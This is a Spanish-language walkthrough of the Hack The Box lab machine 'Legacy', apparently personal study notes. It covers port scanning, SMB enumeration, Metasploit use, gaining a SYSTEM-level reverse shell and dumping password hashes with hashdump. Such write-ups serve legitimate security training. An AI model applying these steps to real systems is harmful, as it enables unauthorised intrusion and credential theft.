# 1 - Legacy \(win\_easy\)

Comenzaremos lanzandole un **nmap** a la maquina

```text
nmap -T4 -p- -A -sS 10.10.10.4
```

![](../../.gitbook/assets/imagen%20%28456%29.png)

Vemos **139 y 445** relacionados con SMB -&gt; SAMBA file share.

![](../../.gitbook/assets/imagen%20%28461%29.png)

Es algo a destacar en los reportes, puede dar acceso a alguna shell.

Vamos a atacar SMB porque es lo abierto.

## Usando smb client de kali

```text
smbclient -L \\10.10.10.4\
```

Aca nos pide la contra de root pero fue un buen intento, otra posible a intentar

```text
smbclient -L \\\\10.10.10.4\\
smbclient -L \\\\10.10.10.4\\$ADMIN
```

No hubo suerte, entremos a **metasploit**

```bash
msfconsole
> search smb_version
//Aca salen los buscadores auxiliares, usamos el siguiente
> use auxiliary/scanner/smb/smb_version
```

Vemos las optiones para ver que solicita

```bash
options
// Como dice RHOSTS podemos atacar una subnet, pero solo estamos contra una maquina
> set rhosts 10.10.10.4
> exploit
```

![](../../.gitbook/assets/imagen%20%28462%29.png)

Buscamos eso en Rapid7 

![Me lo llevo ](../../.gitbook/assets/imagen%20%28460%29.png)

Tiramos **run** y pim pum REVERSE SHELL 

Como estamos en este samba es distinto el shell

```bash
getuid
server username: NT AUTHORITY\SYSTEM    //Basicamente root
```

![](../../.gitbook/assets/imagen%20%28455%29.png)

Vemos que tiene almacenadoh

```bash
help //muy bueno muestra comandos MUY PODEROSOS
hashdump
```

![](../../.gitbook/assets/imagen%20%28458%29.png)

![](../../.gitbook/assets/imagen%20%28459%29.png)

Ahi estan las flags a hackear.

